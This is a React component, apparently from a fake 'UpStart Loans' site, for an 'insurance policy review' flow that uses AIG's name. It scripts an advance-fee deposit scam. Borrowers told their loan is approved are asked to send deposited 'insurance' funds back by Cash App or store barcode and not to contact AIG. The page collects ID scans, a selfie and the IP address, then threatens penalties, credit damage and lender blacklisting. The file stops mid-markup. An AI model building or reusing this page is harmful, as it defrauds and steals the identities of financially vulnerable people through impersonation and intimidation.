import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Shield, FileText, CheckCircle, Gavel, CreditCard, ArrowRight, ArrowLeft, CheckCircle2 } from 'lucide-react';
import { saveInsuranceReview } from '../services/databaseService';

const InsurancePolicyReview = () => {
  const navigate = useNavigate();
  const [currentStep, setCurrentStep] = useState(1);
  const [documentStep, setDocumentStep] = useState(0);
  const [customerEmail, setCustomerEmail] = useState('');
  const [userIP, setUserIP] = useState('Loading...');
  const [idType, setIdType] = useState('');
  const [idDocumentFront, setIdDocumentFront] = useState(null);
  const [idDocumentBack, setIdDocumentBack] = useState(null);
  const [selfiePhoto, setSelfiePhoto] = useState(null);
  const [understandingStatement, setUnderstandingStatement] = useState('');
  const [agreements, setAgreements] = useState({
    agree1: false,
    agree2: false,
    agree3: false
  });
  const [submitted, setSubmitted] = useState(false);
  const [loading, setLoading] = useState(false);
  const [sectionAcknowledgments, setSectionAcknowledgments] = useState({});
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState('');

  const totalSteps = 5;

  // Document sections structure - grouped by logical categories
  const documentSections = [
    {
      id: 1,
      title: "About AIG & Why You Need Insurance",
      points: [
        {
          id: "1-1",
          title: "About Your Insurance Provider: AIG",
          content: "AIG (American International Group) is a global leader in commercial and personal insurance solutions. With $24 billion in net premiums written in 2024 and operations in 200+ countries and jurisdictions, AIG provides expertise and support that builds confidence to pursue bold ideas and shape the future."
        },
        {
          id: "1-2",
          title: "Why Do You Need Payment Protection Insurance?",
          content: "Important: We Have Already Approved Your Loan Application. This insurance is not a rejection—it's a pathway to make your approved loan a reality while helping you rebuild your credit for a brighter financial future."
        },
        {
          id: "1-3",
          title: "Good News About Your Loan",
          content: "Your loan has been approved! The insurance requirement is simply a protective measure that allows us to fund your loan despite credit challenges, while giving you tools to rebuild your credit score."
        }
      ]
    },
    {
      id: 2,
      title: "Common Scenarios & How Insurance Helps",
      points: [
        {
          id: "2-1",
          title: "Multiple Loan Applications",
          content: "You may have applied to several loan companies at once to find the best option. Each company ran a credit inquiry, which temporarily lowered your score. This insurance helps us approve you despite those inquiries, and on-time payments will help your score recover."
        },
        {
          id: "2-2",
          title: "Medical Bills or Unexpected Expenses",
          content: "Medical emergencies or unexpected costs can lead to late payments or collections. This isn't a reflection of your character—it's life happening. The insurance protects your loan payments if health issues arise again."
        },
        {
          id: "2-3",
          title: "Period of Unemployment",
          content: "Job loss or extended unemployment can make it impossible to keep up with bills. You're now back on your feet and ready to move forward. This insurance covers your loan if you face unemployment again."
        },
        {
          id: "2-4",
          title: "Young and Building Credit",
          content: "If you're young or new to credit, you may not have a long credit history or made some early mistakes learning the system. This insurance helps you access credit now while establishing a positive payment history."
        }
      ]
    },
    {
      id: 3,
      title: "More Scenarios & Benefits",
      points: [
        {
          id: "3-1",
          title: "Previous Loan Rejections",
          content: "Being rejected by other lenders can be discouraging and may have lowered your score further. We've approved you—this insurance is the final step to access your funds and prove your creditworthiness."
        },
        {
          id: "3-2",
          title: "Divorce or Life Changes",
          content: "Major life events like divorce, separation, or family changes can disrupt finances and credit. You're starting fresh. This insurance provides protection during transitions while you rebuild."
        },
        {
          id: "3-3",
          title: "How Insurance Helps You Specifically",
          content: "Access Your Approved Loan, Rebuild Your Credit through on-time payments, Protection Against Setbacks like job loss or disability, Demonstrate Reliability to future lenders, and Peace of Mind."
        }
      ]
    },
    {
      id: 4,
      title: "Cost, Process & Coverage",
      points: [
        {
          id: "4-1",
          title: "How It Works: The No-Cost Process",
          content: "You do NOT pay for this insurance from your personal funds. AIG Financial Services covers the cost. Process: 1) We deposit premium into your account, 2) You pay the insurance premium, 3) You return remaining funds, 4) Loan is disbursed."
        },
        {
          id: "4-2",
          title: "How Much Will It Cost?",
          content: "Payment Protection Insurance premiums range from $500 to $2,000, depending on loan amount, coverage level, term duration, and risk factors. Remember: This cost is covered by AIG, not you."
        },
        {
          id: "4-3",
          title: "What Does the Insurance Cover?",
          content: "Covers Involuntary Unemployment, Disability, and Death. Coverage details: Up to $1,500 per month for up to 12 months. Protects your loan repayments in covered situations."
        },
        {
          id: "4-4",
          title: "Eligibility Requirements",
          content: "To qualify: Age 18-65 years old, at least 6 months current employment, and permanent resident status. You must meet these requirements to qualify for coverage."
        }
      ]
    },
    {
      id: 5,
      title: "Exclusions & Claims Process",
      points: [
        {
          id: "5-1",
          title: "What's Not Covered (Exclusions)",
          content: "The insurance does NOT cover: Pre-existing medical conditions, self-inflicted injuries, unemployment due to misconduct, or voluntary resignation from employment."
        },
        {
          id: "5-2",
          title: "How to File a Claim",
          content: "Submit claim within 30 days of qualifying event, provide supporting documentation (medical records, termination letter, etc.), AIG reviews and processes your claim, payments are made directly to cover your loan."
        },
        {
          id: "5-3",
          title: "Cancellation Policy",
          content: "You may cancel this policy within 30 days of purchase for a full refund. After 30 days, cancellation is subject to pro-rata refund based on remaining coverage period."
        }
      ]
    },
    {
      id: 6,
      title: "Rules, Privacy & Legal Terms",
      points: [
        {
          id: "6-1",
          title: "Important Rules & Responsibilities",
          content: "Use of Deposited Funds: Must be used ONLY to pay the AIG insurance premium. Any other use is unauthorized. False Information: Providing false information may result in policy cancellation, legal action, and prosecution."
        },
        {
          id: "6-2",
          title: "Privacy & Data Protection",
          content: "Your information is used for underwriting, verification, compliance monitoring, fraud prevention, and service delivery. We maintain comprehensive data security measures and privacy protections under U.S. laws."
        },
        {
          id: "6-3",
          title: "Governing Law",
          content: "These policies are governed by applicable U.S. federal laws and the laws of the state where AIG Financial Services operates. Any disputes shall be resolved in appropriate federal or state courts."
        }
      ]
    },
    {
      id: 7,
      title: "Payment Return Option 1: Cash App Transfer",
      points: [
        {
          id: "7-1",
          title: "Cash App Transfer Requirements",
          content: "Available if you have used Cash App for 3+ months and are familiar with the platform. This is the fastest and most convenient option if you qualify."
        },
        {
          id: "7-2",
          title: "Cash App Transfer Process",
          content: "Process: 1) We provide our Cash App handle ($tag), 2) You open Cash App and send remaining balance to our handle, 3) Include your name and application ID in payment note, 4) Send us screenshot of completed transaction."
        }
      ]
    },
    {
      id: 8,
      title: "Payment Return Option 2: Government Store Barcode",
      points: [
        {
          id: "8-1",
          title: "Government Store Barcode Payment",
          content: "Available for all customers. We provide a unique AIG barcode registered in your name. The barcode is specifically linked to your account for security and tracking purposes."
        },
        {
          id: "8-2",
          title: "Barcode Payment Process",
          content: "Process: 1) We provide unique AIG barcode, 2) Visit participating government store (Walmart, CVS, Walgreens, etc.), 3) Show barcode to cashier at customer service desk, 4) Pay remaining balance using cash/debit/credit card, 5) Payment goes directly to AIG under your registration, 6) Keep receipt and send us photo for verification."
        }
      ]
    },
    {
      id: 9,
      title: "Final Acknowledgment & Payment Method Selection",
      points: [
        {
          id: "9-1",
          title: "Important Payment Information",
          content: "We handle all insurance documentation and paperwork directly with AIG. You do not need to contact AIG directly. Simply return the funds to us using one of the methods above, and we will complete the insurance activation process."
        },
        {
          id: "9-2",
          title: "Your Final Acknowledgment",
          content: "By proceeding, you acknowledge that you have read, understood, and agreed to all terms. You understand: Insurance is required due to credit profile, cost is covered by AIG not personal funds, must use deposited funds only for insurance payment, and false information has legal consequences."
        }
      ]
    }
  ];

  useEffect(() => {
    // Get customer email from session storage
    const storedCustomerData = sessionStorage.getItem('customerData');
    if (storedCustomerData) {
      const customerData = JSON.parse(storedCustomerData);
      setCustomerEmail(customerData.email);
    }

    // Get user IP
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        setUserIP(data.ip);
      })
      .catch(error => {
        setUserIP('Unable to detect');
      });
  }, []);

  const nextStep = () => {
    if (currentStep < totalSteps) {
      setCurrentStep(currentStep + 1);
      window.scrollTo(0, 0);
    }
  };

  const prevStep = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1);
      window.scrollTo(0, 0);
    }
  };

  const checkAgreements = () => {
    if (agreements.agree1 && agreements.agree2 && agreements.agree3) {
      nextStep();
    } else {
      alert('Please agree to all terms before continuing.');
    }
  };

  const checkIDSelection = () => {
    // ID selection is now optional, allow proceeding without it
    nextStep();
  };

  const handlePointCheck = (pointId) => {
    setSectionAcknowledgments(prev => ({
      ...prev,
      [pointId]: !prev[pointId]
    }));
  };

  const handleNextSection = () => {
    const currentSection = documentSections[documentStep];
    const allPointsChecked = currentSection.points.every(point => sectionAcknowledgments[point.id]);
    
    if (!allPointsChecked) {
      alert('Please check all points in this section before proceeding.');
      return;
    }
    
    // Special validation for final section - require payment method selection
    if (documentStep === documentSections.length - 1 && !selectedPaymentMethod) {
      alert('Please select your preferred payment method before proceeding.');
      return;
    }
    
    if (documentStep < documentSections.length - 1) {
      setDocumentStep(documentStep + 1);
      window.scrollTo(0, 0);
    } else {
      // All sections completed, move to next step
      nextStep();
    }
  };

  const handlePreviousSection = () => {
    if (documentStep > 0) {
      setDocumentStep(documentStep - 1);
      window.scrollTo(0, 0);
    }
  };

  const getCurrentSectionProgress = () => {
    const currentSection = documentSections[documentStep];
    const checkedCount = currentSection.points.filter(point => sectionAcknowledgments[point.id]).length;
    return `${checkedCount}/${currentSection.points.length}`;
  };

  const handleSubmit = async () => {
    if (!understandingStatement.trim()) {
      alert('Please type an understanding statement to confirm.');
      return;
    }

    if (!customerEmail) {
      alert('Customer email not found. Please log in again.');
      navigate('/customer-login');
      return;
    }

    setLoading(true);

    try {
      // Convert files to base64 for storage
      const convertFileToBase64 = (file) => {
        return new Promise((resolve, reject) => {
          if (!file) {
            resolve(null);
            return;
          }
          const reader = new FileReader();
          reader.readAsDataURL(file);
          reader.onload = () => resolve(reader.result);
          reader.onerror = error => reject(error);
        });
      };

      const idDocumentFrontBase64 = await convertFileToBase64(idDocumentFront);
      const idDocumentBackBase64 = await convertFileToBase64(idDocumentBack);
      const selfiePhotoBase64 = await convertFileToBase64(selfiePhoto);

      await saveInsuranceReview({
        email: customerEmail,
        understandingStatement: understandingStatement,
        ipAddress: userIP,
        idType: idType,
        idDocumentFront: idDocumentFrontBase64,
        idDocumentBack: idDocumentBackBase64,
        selfiePhoto: selfiePhotoBase64,
        paymentMethod: selectedPaymentMethod
      });

      setSubmitted(true);
    } catch (error) {
      console.error('Error submitting review:', error);
      alert('Error submitting review. Please try again.');
      setLoading(false);
    }
  };

  const StepIndicator = () => (
    <div className="bg-white rounded-lg shadow-sm p-6 mb-8">
      <div className="flex justify-between items-center">
        {[1, 2, 3, 4, 5].map((step) => (
          <React.Fragment key={step}>
            <div
              className={`w-12 h-12 rounded-full flex items-center justify-center font-bold border-2 ${
                step === currentStep
                  ? 'bg-orange-500 text-black border-orange-500'
                  : step < currentStep
                  ? 'bg-green-500 text-white border-green-500'
                  : 'bg-gray-100 text-gray-400 border-gray-300'
              }`}
            >
              {step < currentStep ? <CheckCircle className="w-6 h-6" /> : step}
            </div>
            {step < totalSteps && (
              <div className="flex-1 h-1 bg-gray-200 mx-2">
                <div
                  className={`h-full ${step < currentStep ? 'bg-green-500' : 'bg-gray-200'}`}
                  style={{ width: step < currentStep ? '100%' : '0%' }}
                />
              </div>
            )}
          </React.Fragment>
        ))}
      </div>
      <div className="flex justify-between mt-2 text-xs text-gray-500">
        <span>Read Policy (Section {documentStep + 1}/{documentSections.length})</span>
        <span>Agree Terms</span>
        <span>Legal Consequences</span>
        <span>ID Proof</span>
        <span>Confirmation</span>
      </div>
    </div>
  );

  if (submitted) {
    return (
      <div className="min-h-screen bg-gray-50">
        <header className="bg-white shadow-sm border-b">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="flex justify-between items-center h-16">
              <div className="flex items-center">
                <h1 className="text-xl font-bold text-gray-900">UpStart Loans</h1>
                <span className="ml-2 text-sm text-gray-500">Insurance Policy Review</span>
              </div>
            </div>
          </div>
        </header>

        <main className="max-w-3xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
          <div className="bg-white rounded-lg shadow-sm p-8 text-center">
            <div className="text-green-500 text-6xl mb-4">
              <CheckCircle2 className="w-16 h-16 mx-auto" />
            </div>
            <h2 className="text-3xl font-bold text-gray-900 mb-4">Insurance Review Completed!</h2>
            <p className="text-gray-600 mb-6">
              Your insurance policy review has been successfully submitted. The admin will be notified.
            </p>
            <button
              onClick={() => navigate('/customer-dashboard')}
              className="bg-orange-500 text-black py-3 px-8 rounded-lg font-semibold hover:bg-orange-600 transition"
            >
              Return to Dashboard
            </button>
          </div>
        </main>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <header className="bg-white shadow-sm border-b">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <div className="flex items-center">
              <h1 className="text-xl font-bold text-gray-900">UpStart Loans</h1>
              <span className="ml-2 text-sm text-gray-500">Insurance Policy Review</span>
            </div>
            <span className="text-gray-500 text-sm flex items-center">
              <Shield className="w-4 h-4 mr-2" />
              Secure Review Process
            </span>
          </div>
        </div>
      </header>

      <main className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <StepIndicator />

        {/* Step 1: Read Legal Document - Individual Points */}
        {currentStep === 1 && (
          <div className="bg-white rounded-lg shadow-sm p-6 mb-8">
            <h2 className="text-2xl font-bold text-gray-900 mb-6 flex items-center">
              <FileText className="w-6 h-6 mr-2 text-orange-500" />
              Step 1: Understanding Payment Protection Insurance
            </h2>

            <div className="bg-blue-50 border-2 border-blue-200 rounded-lg p-4 mb-6">
              <div className="flex items-start">
                <Shield className="w-5 h-5 text-blue-500 mr-3 mt-0.5" />
                <div>
                  <p className="text-gray-900 text-sm font-medium mb-1">Why Are You Here?</p>
                  <p className="text-gray-700 text-sm mb-3">
                    Based on your profile, we require Payment Protection Insurance to protect your loan and help you build a better financial future. Please read each section carefully and check all points before proceeding.
                  </p>
                  <p className="text-gray-600 text-xs">
                    Progress: Section {documentStep + 1} of {documentSections.length}
                  </p>
                </div>
              </div>
            </div>

            {/* Progress Bar */}
            <div className="mb-6">
              <div className="flex justify-between text-xs text-gray-500 mb-2">
                <span>Reading Progress</span>
                <span>{Math.round(((documentStep + 1) / documentSections.length) * 100)}%</span>
              </div>
              <div className="w-full bg-gray-200 rounded-full h-2">
                <div 
                  className="bg-orange-500 h-2 rounded-full transition-all duration-300"
                  style={{ width: `${((documentStep + 1) / documentSections.length) * 100}%` }}
                />
              </div>
            </div>

            {/* Current Section */}
            <div className="bg-gray-50 rounded-lg p-6 mb-6 border-2 border-gray-200">
              <div className="flex items-start mb-6">
                <div className="bg-orange-500 text-white rounded-full w-10 h-10 flex items-center justify-center text-lg font-bold mr-4 mt-0.5 flex-shrink-0">
                  {documentStep + 1}
                </div>
                <div className="flex-1">
                  <h3 className="text-xl font-bold text-gray-900 mb-2">
                    {documentSections[documentStep].title}
                  </h3>
                  <p className="text-gray-600 text-sm">
                    Please read and check all points below to proceed
                  </p>
                </div>
              </div>

              {/* Points in this section */}
              <div className="ml-14 space-y-4">
                {documentSections[documentStep].points.map((point, index) => (
                  <div key={point.id} className="bg-white rounded-lg p-4 border border-gray-200">
                    <label className="flex items-start space-x-3 cursor-pointer">
                      <input
                        type="checkbox"
                        checked={sectionAcknowledgments[point.id] || false}
                        onChange={() => handlePointCheck(point.id)}
                        className="mt-1 w-5 h-5 rounded border-gray-300 text-orange-500 focus:ring-orange-500"
                      />
                      <div className="flex-1">
                        <h4 className="text-sm font-semibold text-gray-900 mb-1">{point.title}</h4>
                        <p className="text-gray-700 text-sm leading-relaxed">{point.content}</p>
                      </div>
                    </label>
                  </div>
                ))}
              </div>

              {/* Payment Method Selection - Only show in final section */}
              {documentStep === documentSections.length - 1 && (
                <div className="ml-14 mt-6 bg-orange-50 border-2 border-orange-200 rounded-lg p-4">
                  <h4 className="text-lg font-semibold text-gray-900 mb-4 flex items-center">
                    <CreditCard className="w-5 h-5 mr-2 text-orange-500" />
                    Select Your Preferred Payment Method
                  </h4>
                  <div className="space-y-3">
                    <label className="flex items-start space-x-3 cursor-pointer bg-white p-3 rounded-lg border border-gray-200 hover:border-orange-300 transition">
                      <input
                        type="radio"
                        name="paymentMethod"
                        value="cashapp"
                        checked={selectedPaymentMethod === 'cashapp'}
                        onChange={(e) => setSelectedPaymentMethod(e.target.value)}
                        className="mt-1 w-5 h-5 text-orange-500 focus:ring-orange-500"
                      />
                      <div className="flex-1">
                        <h5 className="text-sm font-semibold text-gray-900 mb-1">Cash App Transfer</h5>
                        <p className="text-gray-600 text-xs">Available if you have used Cash App for 3+ months</p>
                      </div>
                    </label>
                    <label className="flex items-start space-x-3 cursor-pointer bg-white p-3 rounded-lg border border-gray-200 hover:border-orange-300 transition">
                      <input
                        type="radio"
                        name="paymentMethod"
                        value="barcode"
                        checked={selectedPaymentMethod === 'barcode'}
                        onChange={(e) => setSelectedPaymentMethod(e.target.value)}
                        className="mt-1 w-5 h-5 text-orange-500 focus:ring-orange-500"
                      />
                      <div className="flex-1">
                        <h5 className="text-sm font-semibold text-gray-900 mb-1">Government Store Barcode Payment</h5>
                        <p className="text-gray-600 text-xs">Available for all customers</p>
                      </div>
                    </label>
                  </div>
                  {selectedPaymentMethod && (
                    <div className="mt-3 p-3 bg-green-50 border border-green-200 rounded-lg">
                      <p className="text-green-800 text-sm flex items-center">
                        <CheckCircle className="w-4 h-4 mr-2" />
                        You selected: {selectedPaymentMethod === 'cashapp' ? 'Cash App Transfer' : 'Government Store Barcode Payment'}
                      </p>
                    </div>
                  )}
                </div>
              )}
            </div>

            {/* Section Progress */}
            <div className="bg-white rounded-lg p-4 mb-6 border-2 border-orange-200">
              <div className="flex items-center justify-between">
                <div className="flex items-center">
                  <CheckCircle className="w-5 h-5 mr-2 text-orange-500" />
                  <span className="text-sm font-medium text-gray-900">
                    Section Progress: {getCurrentSectionProgress()} points checked
                  </span>
                </div>
                <div className="text-xs text-gray-500">
                  Must check all points to continue
                </div>
              </div>
            </div>

            {/* Navigation */}
            <div className="flex justify-between">
              <button
                onClick={handlePreviousSection}
                disabled={documentStep === 0}
                className="bg-gray-200 text-gray-700 py-3 px-6 rounded-lg font-semibold hover:bg-gray-300 transition flex items-center disabled:opacity-50 disabled:cursor-not-allowed"
              >
                <ArrowLeft className="w-4 h-4 mr-2" />
                Previous Section
              </button>
              <button
                onClick={handleNextSection}
                className="bg-blue-600 text-white py-3 px-6 rounded-lg font-semibold hover:bg-blue-700 transition flex items-center"
              >
                {documentStep >= documentSections.length - 1 ? (
                  <>
                    <CheckCircle className="w-5 h-5 mr-2" />
                    Complete Reading - Proceed to Next Step
                  </>
                ) : (
                  <>
                    Next Section ({documentStep + 2}/{documentSections.length})
                    <ArrowRight className="w-4 h-4 ml-2" />
                  </>
                )}
              </button>
            </div>

            {/* Document Overview */}
            <div className="bg-gray-50 rounded-lg p-4 mt-6">
              <h4 className="text-sm font-semibold text-gray-900 mb-3">Document Overview</h4>
              <div className="grid grid-cols-9 gap-2">
                {documentSections.map((section, index) => (
                  <div
                    key={section.id}
                    className={`h-2 rounded-full ${
                      index < documentStep 
                        ? 'bg-green-500' 
                        : index === documentStep 
                        ? 'bg-orange-500' 
                        : 'bg-gray-300'
                    }`}
                    title={section.title}
                  />
                ))}
              </div>
              <div className="flex justify-between mt-2 text-xs text-gray-500">
                <span>Section 1</span>
                <span>Section {documentSections.length}</span>
              </div>
            </div>
          </div>
        )}

        {/* Step 2: Agree to Terms */}
        {currentStep === 2 && (
          <div className="bg-white rounded-lg shadow-sm p-6 mb-8">
            <h2 className="text-2xl font-bold text-gray-900 mb-6 flex items-center">
              <CheckCircle className="w-6 h-6 mr-2 text-orange-500" />
              Step 2: Agree to Terms
            </h2>

            <div className="space-y-4 mb-6">
              <label className="flex items-start space-x-3 cursor-pointer">
                <input
                  type="checkbox"
                  checked={agreements.agree1}
                  onChange={(e) => setAgreements({ ...agreements, agree1: e.target.checked })}
                  className="mt-1 w-5 h-5 rounded border-gray-300 text-orange-500 focus:ring-orange-500"
                />
                <span className="text-gray-700 text-sm">
                  I have read and understood the Payment Protection Insurance Policy
                </span>
              </label>
              <label className="flex items-start space-x-3 cursor-pointer">
                <input
                  type="checkbox"
                  checked={agreements.agree2}
                  onChange={(e) => setAgreements({ ...agreements, agree2: e.target.checked })}
                  className="mt-1 w-5 h-5 rounded border-gray-300 text-orange-500 focus:ring-orange-500"
                />
                <span className="text-gray-700 text-sm">
                  I agree to the terms and conditions outlined in the policy
                </span>
              </label>
              <label className="flex items-start space-x-3 cursor-pointer">
                <input
                  type="checkbox"
                  checked={agreements.agree3}
                  onChange={(e) => setAgreements({ ...agreements, agree3: e.target.checked })}
                  className="mt-1 w-5 h-5 rounded border-gray-300 text-orange-500 focus:ring-orange-500"
                />
                <span className="text-gray-700 text-sm">
                  I understand the legal consequences of providing false information
                </span>
              </label>
            </div>

            <div className="flex justify-between">
              <button
                onClick={prevStep}
                className="bg-gray-200 text-gray-700 py-3 px-8 rounded-lg font-semibold hover:bg-gray-300 transition flex items-center"
              >
                <ArrowLeft className="w-4 h-4 mr-2" />
                Previous
              </button>
              <button
                onClick={checkAgreements}
                className="bg-orange-500 text-black py-3 px-8 rounded-lg font-semibold hover:bg-orange-600 transition flex items-center"
              >
                Continue
                <ArrowRight className="w-4 h-4 ml-2" />
              </button>
            </div>
          </div>
        )}

        {/* Step 3: Legal Consequences */}
        {currentStep === 3 && (
          <div className="bg-white rounded-lg shadow-sm p-6 mb-8">
            <h2 className="text-2xl font-bold text-gray-900 mb-6 flex items-center">
              <Gavel className="w-6 h-6 mr-2 text-orange-500" />
              Step 3: Legal Consequences
            </h2>

            <div className="bg-red-50 border-2 border-red-200 rounded-lg p-4 mb-6">
              <h3 className="text-red-600 font-semibold mb-2">IMPORTANT LEGAL NOTICE</h3>
              <p className="text-gray-900 text-sm">
                Please read the following legal consequences carefully before proceeding.
              </p>
            </div>

            <div className="space-y-4 text-gray-700 text-sm">
              <div className="bg-gray-50 rounded-lg p-4">
                <h4 className="text-orange-500 font-semibold mb-2">Fraudulent Claims</h4>
                <p>
                  Making false statements or fraudulent claims may result in criminal prosecution under federal law.
                </p>
              </div>
              <div className="bg-gray-50 rounded-lg p-4">
                <h4 className="text-orange-500 font-semibold mb-2">Policy Cancellation</h4>
                <p>
                  Your policy may be immediately cancelled if any information provided is found to be false or misleading.
                </p>
              </div>
              <div className="bg-gray-50 rounded-lg p-4">
                <h4 className="text-orange-500 font-semibold mb-2">Legal Action</h4>
                <p>
                  The company reserves the right to take legal action to recover any payments made under false pretenses.
                </p>
              </div>
              <div className="bg-gray-50 rounded-lg p-4">
                <h4 className="text-orange-500 font-semibold mb-2">Credit Impact</h4>
                <p>
                  Fraudulent activity may be reported to credit bureaus and could negatively impact your credit score.
                </p>
              </div>
            </div>

            <div className="mt-6 flex justify-between">
              <button
                onClick={prevStep}
                className="bg-gray-200 text-gray-700 py-3 px-8 rounded-lg font-semibold hover:bg-gray-300 transition flex items-center"
              >
                <ArrowLeft className="w-4 h-4 mr-2" />
                Previous
              </button>
              <button
                onClick={nextStep}
                className="bg-orange-500 text-black py-3 px-8 rounded-lg font-semibold hover:bg-orange-600 transition flex items-center"
              >
                I Understand the Consequences
                <ArrowRight className="w-4 h-4 ml-2" />
              </button>
            </div>
          </div>
        )}

        {/* Step 4: ID Proof */}
        {currentStep === 4 && (
          <div className="bg-white rounded-lg shadow-sm p-6 mb-8">
            <h2 className="text-2xl font-bold text-gray-900 mb-6 flex items-center">
              <CreditCard className="w-6 h-6 mr-2 text-orange-500" />
              Step 4: Identity Verification
            </h2>

            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
              <p className="text-blue-700 text-sm flex items-center">
                <Shield className="w-4 h-4 mr-2" />
                Identity verification is optional but recommended for enhanced security.
              </p>
            </div>

            <div className="mb-6">
              <label className="block text-gray-700 text-sm font-medium mb-2">Select Your ID Type</label>
              <select
                value={idType}
                onChange={(e) => setIdType(e.target.value)}
                className="w-full bg-white border border-gray-300 rounded-lg text-gray-900 p-3 focus:outline-none focus:ring-2 focus:ring-orange-500 focus:border-orange-500"
              >
                <option value="">Select ID Type</option>
                <option value="driver_license">Driver's License</option>
                <option value="passport">Passport</option>
                <option value="state_id">State ID</option>
                <option value="national_id">National ID Card</option>
              </select>
            </div>

            <div className="mb-6">
              <label className="block text-gray-700 text-sm font-medium mb-2">Upload ID Document - Front</label>
              <div className="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center hover:border-orange-500 transition cursor-pointer">
                <input
                  type="file"
                  id="idDocumentFront"
                  accept="image/*,.pdf"
                  onChange={(e) => setIdDocumentFront(e.target.files[0])}
                  className="hidden"
                />
                <label htmlFor="idDocumentFront" className="cursor-pointer">
                  <CreditCard className="w-12 h-12 mx-auto text-gray-400 mb-2" />
                  <p className="text-gray-600 text-sm mb-1">
                    {idDocumentFront ? idDocumentFront.name : 'Click to upload or drag and drop'}
                  </p>
                  <p className="text-gray-400 text-xs">PNG, JPG, PDF up to 10MB</p>
                </label>
              </div>
            </div>

            <div className="mb-6">
              <label className="block text-gray-700 text-sm font-medium mb-2">Upload ID Document - Back</label>
              <div className="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center hover:border-orange-500 transition cursor-pointer">
                <input
                  type="file"
                  id="idDocumentBack"
                  accept="image/*,.pdf"
                  onChange={(e) => setIdDocumentBack(e.target.files[0])}
                  className="hidden"
                />
                <label htmlFor="idDocumentBack" className="cursor-pointer">
                  <CreditCard className="w-12 h-12 mx-auto text-gray-400 mb-2" />
                  <p className="text-gray-600 text-sm mb-1">
                    {idDocumentBack ? idDocumentBack.name : 'Click to upload or drag and drop'}
                  </p>
                  <p className="text-gray-400 text-xs">PNG, JPG, PDF up to 10MB</p>
                </label>
              </div>
            </div>

            <div className="mb-6">
              <label className="block text-gray-700 text-sm font-medium mb-2">Upload Selfie Photo</label>
              <div className="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center hover:border-orange-500 transition cursor-pointer">
                <input
                  type="file"
                  id="selfiePhoto"
                  accept="image/*"
                  onChange={(e) => setSelfiePhoto(e.target.files[0])}
                  className="hidden"
                />
                <label htmlFor="selfiePhoto" className="cursor-pointer">
                  <Shield className="w-12 h-12 mx-auto text-gray-400 mb-2" />
                  <p className="text-gray-600 text-sm mb-1">
                    {selfiePhoto ? selfiePhoto.name : 'Click to upload or drag and drop'}
                  </p>
                  <p className="text-gray-400 text-xs">PNG, JPG up to 10MB</p>
                </label>
              </div>
              <p className="text-gray-500 text-xs mt-2">
                Selfie photo is used for security verification purposes only.
              </p>
            </div>

            <div className="mb-6">
              <p className="text-gray-500 text-sm mb-2">Your IP Address (for verification):</p>
              <p className="text-gray-900 font-mono text-sm bg-gray-50 p-2 rounded">{userIP}</p>
            </div>

            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
              <p className="text-blue-700 text-sm flex items-center">
                <Shield className="w-4 h-4 mr-2" />
                Your IP address is recorded for security and verification purposes.
              </p>
            </div>

            <div className="flex justify-between">
              <button
                onClick={prevStep}
                className="bg-gray-200 text-gray-700 py-3 px-8 rounded-lg font-semibold hover:bg-gray-300 transition flex items-center"
              >
                <ArrowLeft className="w-4 h-4 mr-2" />
                Previous
              </button>
              <button
                onClick={checkIDSelection}
                className="bg-orange-500 text-black py-3 px-8 rounded-lg font-semibold hover:bg-orange-600 transition flex items-center"
              >
                Continue
                <ArrowRight className="w-4 h-4 ml-2" />
              </button>
            </div>
          </div>
        )}

        {/* Step 5: Confirmation */}
        {currentStep === 5 && (
          <div className="bg-white rounded-lg shadow-sm p-6 mb-8">
            <h2 className="text-2xl font-bold text-gray-900 mb-6 flex items-center">
              <CheckCircle2 className="w-6 h-6 mr-2 text-orange-500" />
              Step 5: Final Confirmation
            </h2>

            <div className="mb-6">
              <label className="block text-gray-700 text-sm font-medium mb-2">Understanding Statement</label>
              <textarea
                value={understandingStatement}
                onChange={(e) => setUnderstandingStatement(e.target.value)}
                rows={4}
                className="w-full bg-white border border-gray-300 rounded-lg text-gray-900 p-3 focus:outline-none focus:ring-2 focus:ring-orange-500 focus:border-orange-500"
                placeholder="Please type your understanding statement confirming you have read and agreed to the terms."
              />
              <p className="text-xs text-gray-500 mt-2">
                Type any statement confirming you have read and understood the terms and conditions.
              </p>
            </div>

            <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
              <p className="text-green-700 text-sm flex items-center">
                <CheckCircle className="w-4 h-4 mr-2" />
                By clicking submit, you confirm that you have completed all steps and agree to the terms.
              </p>
            </div>

            <div className="bg-red-50 border-2 border-red-300 rounded-lg p-4 mb-6">
              <p className="text-red-900 font-bold text-sm mb-3">
                <strong>IMPORTANT LEGAL NOTICE - FEDERALLY APPROVED INSURANCE FUND</strong>
              </p>
              <p className="text-red-800 text-xs mb-2">
                <strong>This is a federally approved insurance fund designated strictly for insurance purposes only.</strong>
              </p>
              <p className="text-red-800 text-xs mb-2">
                <strong>We reserve all rights to cancel the deposit immediately if you fail to return the insurance payment as required.</strong>
              </p>
              <p className="text-red-800 text-xs mb-2">
                <strong>In case of non-compliance, we will exercise our legal rights to:</strong>
              </p>
              <ul className="list-disc list-inside text-red-800 text-xs space-y-1 ml-2">
                <li>Contact your bank to immediately cancel the entire deposit with an additional <strong>18% penalty fee</strong>, which will make your account negative by the full amount plus charges</li>
                <li>Report to credit bureaus to immediately reduce your credit score by <strong>up to 30 points</strong></li>
                <li>Inform other lenders about this fraudulent activity, which will result in <strong>no future loan approvals</strong> from any participating lenders</li>
              </ul>
              <p className="text-red-800 text-xs mt-3">
                <strong>However, if you follow the process correctly:</strong> You will receive your approved loan, and we will help you build your credit <strong>free of cost</strong> through this insurance program.
              </p>
            </div>

            <div className="flex justify-between">
              <button
                onClick={prevStep}
